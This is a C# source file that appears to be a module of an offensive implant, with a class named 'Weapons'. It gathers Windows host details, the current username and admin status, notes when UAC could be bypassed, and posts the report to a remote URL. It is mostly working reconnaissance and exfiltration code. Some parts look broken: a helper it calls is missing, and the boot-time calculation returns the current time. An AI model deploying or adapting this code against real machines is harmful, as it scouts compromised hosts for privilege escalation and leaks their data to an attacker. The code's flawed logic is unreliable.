using Microsoft.Win32;
using System;
using System.DirectoryServices.AccountManagement;
using System.Net;
using System.Net.NetworkInformation;
using System.Security.Principal;
using System.Text;

namespace CursedSpaghetti
{
    class Weapons
    {
        // Basic System Information Gathering
        public static void ListBasicOSInfo(string url)
        {
            string ProductName = Utils.GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
            string EditionID = Utils.GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "EditionID");
            string ReleaseId = Utils.GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId");
            string BuildBranch = Utils.GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "BuildBranch");
            string CurrentMajorVersionNumber = Utils.GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "CurrentMajorVersionNumber");
            string CurrentVersion = Utils.GetRegValue("HKLM", "Software\\Microsoft\\Windows NT\\CurrentVersion", "CurrentVersion");

            string arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            string userName = WindowsIdentity.GetCurrent().Name;
            string ProcessorCount = Environment.ProcessorCount.ToString();

            bool isHighIntegrity = Utils.IsHighIntegrity();
            bool isLocalAdmin = Utils.IsLocalAdmin(userName);

            DateTime now = DateTime.UtcNow;
            DateTime boot = now - TimeSpan.FromMilliseconds(Environment.TickCount);
            DateTime BootTime = boot + TimeSpan.FromMilliseconds(Environment.TickCount);

            String strHostName = Dns.GetHostName();
            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
            string dnsDomain = properties.DomainName;
            StringBuilder sb = new StringBuilder();

            sb.AppendLine("\r\n  === Basic Info Gathering ===");
            sb.AppendLine(String.Format("  {0,-30}:  {1}", "Hostname", strHostName));
            sb.AppendLine(String.Format("  {0,-30}:  {1}", "Domain Name", dnsDomain));
            sb.AppendLine(String.Format("  {0,-30}:  {1}", "Username", userName));
            sb.AppendLine(String.Format("  {0,-30}:  {1}", "ProductName", ProductName));
            sb.AppendLine(String.Format("  {0,-30}:  {1}", "EditionID", EditionID));
            sb.AppendLine(String.Format("  {0,-30}:  {1}", "ReleaseId", ReleaseId));
            sb.AppendLine(String.Format("  {0,-30}:  {1}", "BuildBranch", BuildBranch));
            sb.AppendLine(String.Format("  {0,-30}:  {1}", "CurrentMajorVersionNumber", CurrentMajorVersionNumber));
            sb.AppendLine(String.Format("  {0,-30}:  {1}", "CurrentVersion", CurrentVersion));
            sb.AppendLine(String.Format("  {0,-30}:  {1}", "Architecture", arch));
            sb.AppendLine(String.Format("  {0,-30}:  {1}", "ProcessorCount", ProcessorCount));
            sb.AppendLine(String.Format("  {0,-30}:  {1}", "BootTime (approx)", BootTime));
            sb.AppendLine(String.Format("  {0,-30}:  {1}", "HighIntegrity", isHighIntegrity));
            sb.AppendLine(String.Format("  {0,-30}:  {1}", "IsLocalAdmin", isLocalAdmin));

            if (!isHighIntegrity && isLocalAdmin)
            {
                sb.AppendLine("    -- UAC can be bypassed. --");
            }

            Utilities.Post(url, sb.ToString());
        }

        class Utils
        {
            public static string GetRegValue(string hive, string path, string value)
            {
                string regKeyValue = "";
                if (hive == "HKCU")
                {
                    var regKey = Registry.CurrentUser.OpenSubKey(path);
                    if (regKey != null)
                    {
                        regKeyValue = String.Format("{0}", regKey.GetValue(value));
                    }
                    return regKeyValue;
                }
                else if (hive == "HKU")
                {
                    var regKey = Registry.Users.OpenSubKey(path);
                    if (regKey != null)
                    {
                        regKeyValue = String.Format("{0}", regKey.GetValue(value));
                    }
                    return regKeyValue;
                }
                else
                {
                    var regKey = Registry.LocalMachine.OpenSubKey(path);
                    if (regKey != null)
                    {
                        regKeyValue = String.Format("{0}", regKey.GetValue(value));
                    }
                    return regKeyValue;
                }
            }

            public static bool IsHighIntegrity()
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }

            public static bool IsLocalAdmin(string userName)
            {

                PrincipalContext ctx = new PrincipalContext(ContextType.Machine);
                UserPrincipal usr = UserPrincipal.FindByIdentity(ctx, IdentityType.SamAccountName, userName);

                foreach (Principal p in usr.GetAuthorizationGroups())
                {
                    if (p.ToString() == "Administrators")
                    {
                        return true;
                    }
                }
                return false;
            }
        }
    }
}